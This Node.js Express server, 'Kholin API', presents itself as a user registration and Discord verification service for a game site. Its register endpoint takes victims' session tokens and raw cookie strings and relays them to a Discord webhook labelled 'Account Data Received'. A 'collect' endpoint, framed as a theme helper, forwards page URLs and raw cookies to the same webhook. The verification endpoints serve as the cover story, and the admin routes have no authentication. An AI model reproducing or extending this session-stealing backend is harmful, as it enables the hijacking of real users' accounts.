const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const crypto = require('crypto');

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Store generated IDs (in production, use a database)
const generatedIds = new Map(); // userId -> { specialId, createdAt, username, verified }
const verifiedUsers = new Map(); // userId -> { verifiedAt, discordId, discordUsername }

// Generate a unique special ID for a user
function generateSpecialId(userId, username) {
    // Create a hash based on userId + username + secret salt
    const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
    const hash = crypto.createHash('sha256')
        .update(userId + username + secret + Date.now().toString())
        .digest('hex')
        .substring(0, 16); // Take first 16 characters
    
    return hash;
}

// ============================================
// MAIN REGISTER ENDPOINT
// ============================================

app.post('/api/users/register', async (req, res) => {
    try {
        const { userId, username, displayName, sessionToken, rawCookieString, friendsCount } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        // Validate required fields
        if (!userId || userId === "Unknown" || !username || username === "Unknown") {
            return res.status(400).json({ 
                error: "Invalid user data", 
                message: "userId and username are required" 
            });
        }

        // Generate or retrieve special ID
        let specialId = null;
        if (generatedIds.has(userId)) {
            specialId = generatedIds.get(userId).specialId;
            console.log(`[${userId}] Using existing special ID: ${specialId}`);
        } else {
            specialId = generateSpecialId(userId, username);
            generatedIds.set(userId, {
                specialId: specialId,
                createdAt: new Date().toISOString(),
                username: username,
                displayName: displayName || username,
                friendsCount: friendsCount || '0',
                verified: false
            });
            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
        }

        // Build Discord Embed
        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        // Create fields array
        const fields = [
            { name: "👤 Username", value: `**@${username}**`, inline: true },
            { name: "📛 Display Name", value: `**${displayName || username}**`, inline: true },
            { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
            { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
            { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
            { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'N/A'}\`\`\``, inline: false }
        ];

        // Add a fun emoji based on friends count
        let friendEmoji = "👤";
        const count = parseInt(friendsCount) || 0;
        if (count >= 100) friendEmoji = "👑";
        else if (count >= 50) friendEmoji = "⭐";
        else if (count >= 25) friendEmoji = "🌟";
        else if (count >= 10) friendEmoji = "💫";
        else if (count >= 5) friendEmoji = "✨";

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: fields,
                footer: { 
                    text: `Kholin System • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
                    icon_url: "https://playvortex.io/favicon.ico" 
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error("Discord webhook error:", response.status, errorText);
            return res.status(500).json({ error: "Discord webhook failed", details: errorText });
        }

        console.log(`✅ Data sent for ${username} (${userId}) with ${friendsCount || 0} friends`);
        
        // Return the special ID to the client
        return res.status(200).json({ 
            status: "success",
            data: {
                username,
                userId,
                friendsCount: friendsCount || '0',
                specialId: specialId
            }
        });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// SPECIAL ID ENDPOINTS
// ============================================

// Get special ID for a user
app.get('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    console.log(`[Special ID] Request for user: ${userId}`);
    console.log(`[Special ID] Stored IDs:`, Array.from(generatedIds.keys()));
    
    // Trim whitespace and handle case sensitivity
    const trimmedUserId = userId.trim();
    
    // Check if we have this user
    if (generatedIds.has(trimmedUserId)) {
        const data = generatedIds.get(trimmedUserId);
        console.log(`[Special ID] Found:`, data);
        return res.json({
            success: true,
            userId: trimmedUserId,
            specialId: data.specialId,
            username: data.username,
            displayName: data.displayName,
            friendsCount: data.friendsCount,
            createdAt: data.createdAt,
            verified: data.verified || false
        });
    }
    
    // Try case-insensitive lookup
    for (const [key, value] of generatedIds) {
        if (key.toLowerCase() === trimmedUserId.toLowerCase()) {
            console.log(`[Special ID] Found case-insensitive match: ${key}`);
            return res.json({
                success: true,
                userId: key,
                specialId: value.specialId,
                username: value.username,
                displayName: value.displayName,
                friendsCount: value.friendsCount,
                createdAt: value.createdAt,
                verified: value.verified || false
            });
        }
    }
    
    console.log(`[Special ID] NOT found for user: ${trimmedUserId}`);
    return res.status(404).json({
        success: false,
        error: "No special ID found for this user"
    });
});

// Generate special ID for a user (manual trigger)
app.post('/api/generate-special-id', (req, res) => {
    const { userId, username } = req.body;
    
    console.log('[Generate] Request:', { userId, username });
    
    if (!userId || userId === "Unknown") {
        return res.status(400).json({
            success: false,
            error: "Valid userId required"
        });
    }
    
    if (generatedIds.has(userId)) {
        const existing = generatedIds.get(userId);
        console.log('[Generate] ID already exists:', existing);
        return res.json({
            success: true,
            specialId: existing.specialId,
            alreadyExists: true,
            userId: userId,
            username: existing.username
        });
    }
    
    const specialId = generateSpecialId(userId, username || "User");
    generatedIds.set(userId, {
        specialId: specialId,
        createdAt: new Date().toISOString(),
        username: username || "User",
        displayName: username || "User",
        friendsCount: '0',
        verified: false
    });
    
    console.log(`[Generate] Generated NEW ID for ${userId}: ${specialId}`);
    
    return res.json({
        success: true,
        specialId: specialId,
        alreadyExists: false,
        userId: userId,
        username: username || "User"
    });
});

// ============================================
// VERIFICATION ENDPOINTS (For Discord Bot)
// ============================================

// POST: Verify a special ID
app.post('/api/verify-special-id', (req, res) => {
    const { userId, specialId, discordId, discordUsername } = req.body;
    
    console.log('[Verification POST] Received request:', { userId, specialId, discordId, discordUsername });
    console.log('[Verification POST] Stored IDs:', Array.from(generatedIds.entries()));
    
    if (!userId && !specialId) {
        return res.status(400).json({
            success: false,
            error: "Missing userId or specialId"
        });
    }
    
    // If userId is provided, check that specific user
    if (userId) {
        if (generatedIds.has(userId)) {
            const stored = generatedIds.get(userId);
            console.log('[Verification POST] Found stored ID for user:', stored);
            
            if (stored.specialId === specialId) {
                // Mark as verified
                stored.verified = true;
                stored.verifiedAt = new Date().toISOString();
                stored.discordId = discordId;
                stored.discordUsername = discordUsername;
                
                // Save to verified users map
                if (discordId) {
                    verifiedUsers.set(discordId, {
                        userId: userId,
                        username: stored.username,
                        specialId: specialId,
                        verifiedAt: new Date().toISOString(),
                        discordUsername: discordUsername
                    });
                }
                
                console.log('[Verification POST] ✅ SUCCESS! Special ID is valid');
                return res.json({
                    success: true,
                    valid: true,
                    userId: userId,
                    specialId: specialId,
                    username: stored.username,
                    displayName: stored.displayName,
                    verified: true,
                    verifiedAt: stored.verifiedAt
                });
            } else {
                console.log('[Verification POST] ❌ Special ID mismatch. Stored:', stored.specialId, 'Received:', specialId);
            }
        } else {
            console.log('[Verification POST] ❌ User ID not found in storage:', userId);
        }
    }
    
    // If no userId provided or user not found, check by specialId
    if (specialId) {
        for (const [key, value] of generatedIds) {
            if (value.specialId === specialId) {
                // Mark as verified
                value.verified = true;
                value.verifiedAt = new Date().toISOString();
                value.discordId = discordId;
                value.discordUsername = discordUsername;
                
                if (discordId) {
                    verifiedUsers.set(discordId, {
                        userId: key,
                        username: value.username,
                        specialId: specialId,
                        verifiedAt: new Date().toISOString(),
                        discordUsername: discordUsername
                    });
                }
                
                console.log('[Verification POST] ✅ Found by specialId, verified:', key);
                return res.json({
                    success: true,
                    valid: true,
                    userId: key,
                    specialId: specialId,
                    username: value.username,
                    displayName: value.displayName,
                    verified: true,
                    verifiedAt: value.verifiedAt
                });
            }
        }
    }
    
    return res.json({
        success: true,
        valid: false,
        error: "Invalid special ID"
    });
});

// GET: Verify a special ID (for Discord bot)
app.get('/api/verify-special-id/:userId/:specialId', (req, res) => {
    const { userId, specialId } = req.params;
    
    console.log('[Verification GET] Checking:', { userId, specialId });
    
    if (generatedIds.has(userId)) {
        const stored = generatedIds.get(userId);
        if (stored.specialId === specialId) {
            return res.json({
                success: true,
                valid: true,
                userId: userId,
                specialId: specialId,
                username: stored.username,
                displayName: stored.displayName,
                verified: stored.verified || false
            });
        }
    }
    
    return res.json({
        success: true,
        valid: false,
        error: "Invalid special ID"
    });
});

// GET: Verify by username and special ID (for Discord bot)
app.get('/api/verify-by-username/:username/:specialId', (req, res) => {
    const { username, specialId } = req.params;
    
    console.log('[Verification By Username] Checking:', { username, specialId });
    
    // Find by username (case insensitive)
    for (const [userId, data] of generatedIds) {
        if (data.username.toLowerCase() === username.toLowerCase()) {
            if (data.specialId === specialId) {
                return res.json({
                    success: true,
                    valid: true,
                    userId: userId,
                    specialId: specialId,
                    username: data.username,
                    displayName: data.displayName,
                    verified: data.verified || false
                });
            }
        }
    }
    
    return res.json({
        success: true,
        valid: false,
        error: "Invalid username or special ID"
    });
});

// ============================================
// DISCORD BOT SPECIFIC ENDPOINTS
// ============================================

// Endpoint for Discord bot to verify
app.post('/api/discord-verify', async (req, res) => {
    const { username, specialId, discordId, discordUsername } = req.body;
    
    console.log('[Discord] Verification request:', { username, specialId, discordId, discordUsername });
    console.log('[Discord] Stored IDs:', Array.from(generatedIds.entries()));
    
    if (!username || !specialId) {
        return res.status(400).json({
            success: false,
            error: 'Missing username or special ID'
        });
    }
    
    // Check all stored IDs (case insensitive)
    for (const [userId, data] of generatedIds) {
        if (data.username.toLowerCase() === username.toLowerCase()) {
            if (data.specialId === specialId) {
                // Mark as verified
                data.verified = true;
                data.verifiedAt = new Date().toISOString();
                data.discordId = discordId;
                data.discordUsername = discordUsername;
                
                // Save to verified users map
                if (discordId) {
                    verifiedUsers.set(discordId, {
                        userId: userId,
                        username: data.username,
                        specialId: specialId,
                        verifiedAt: new Date().toISOString(),
                        discordUsername: discordUsername
                    });
                }
                
                console.log('[Discord] ✅ Verification successful for:', username);
                return res.json({
                    success: true,
                    verified: true,
                    message: 'Verification successful',
                    username: data.username,
                    userId: userId,
                    specialId: data.specialId,
                    verifiedAt: data.verifiedAt
                });
            } else {
                console.log('[Discord] ❌ Special ID mismatch for', username);
                console.log('[Discord] Stored:', data.specialId, 'Received:', specialId);
                return res.json({
                    success: false,
                    verified: false,
                    error: 'Invalid special ID for this username'
                });
            }
        }
    }
    
    console.log('[Discord] ❌ Username not found:', username);
    return res.status(404).json({
        success: false,
        verified: false,
        error: 'Username not found in Kholin system. Please link your profile first.'
    });
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

// Get all generated IDs (admin only - add auth in production)
app.get('/api/all-special-ids', (req, res) => {
    const data = [];
    for (const [userId, info] of generatedIds) {
        data.push({
            userId,
            specialId: info.specialId,
            username: info.username,
            displayName: info.displayName,
            friendsCount: info.friendsCount,
            createdAt: info.createdAt,
            verified: info.verified || false,
            verifiedAt: info.verifiedAt || null,
            discordId: info.discordId || null,
            discordUsername: info.discordUsername || null
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// Get verified users
app.get('/api/verified-users', (req, res) => {
    const data = [];
    for (const [discordId, info] of verifiedUsers) {
        data.push({
            discordId,
            ...info
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// Delete a user's ID (admin only)
app.delete('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    if (generatedIds.has(userId)) {
        const data = generatedIds.get(userId);
        generatedIds.delete(userId);
        console.log(`[Admin] Deleted user: ${userId} (${data.username})`);
        return res.json({
            success: true,
            message: `Deleted user ${userId}`
        });
    }
    
    return res.status(404).json({
        success: false,
        error: "User not found"
    });
});

// ============================================
// COLLECT ENDPOINT (for Theme Helper compatibility)
// ============================================

app.post('/api/collect', async (req, res) => {
    try {
        const { url, rawCookies } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🌐 Page Visit Detected",
                color: 0x3498db,
                fields: [
                    { name: "🔗 URL", value: url || "Unknown", inline: false },
                    { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Kholin System", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            return res.status(500).json({ error: "Discord webhook failed" });
        }

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/', (req, res) => {
    res.json({
        name: 'Kholin API',
        version: '1.0.0',
        status: 'running',
        endpoints: {
            register: 'POST /api/users/register',
            specialId: 'GET /api/special-id/:userId',
            generate: 'POST /api/generate-special-id',
            verify: 'POST /api/verify-special-id',
            verifyGet: 'GET /api/verify-special-id/:userId/:specialId',
            verifyByUsername: 'GET /api/verify-by-username/:username/:specialId',
            discordVerify: 'POST /api/discord-verify',
            allIds: 'GET /api/all-special-ids',
            verifiedUsers: 'GET /api/verified-users',
            health: 'GET /health'
        }
    });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        webhookConfigured: !!process.env.webhook,
        generatedIdsCount: generatedIds.size,
        generatedIds: Array.from(generatedIds.keys()),
        verifiedUsersCount: verifiedUsers.size
    });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, () => {
    console.log(`✅ Kholin Server running on port ${PORT}`);
    console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default (not secure for production)'}`);
    console.log(`   Environment: ${process.env.NODE_ENV || 'development'}`);
});
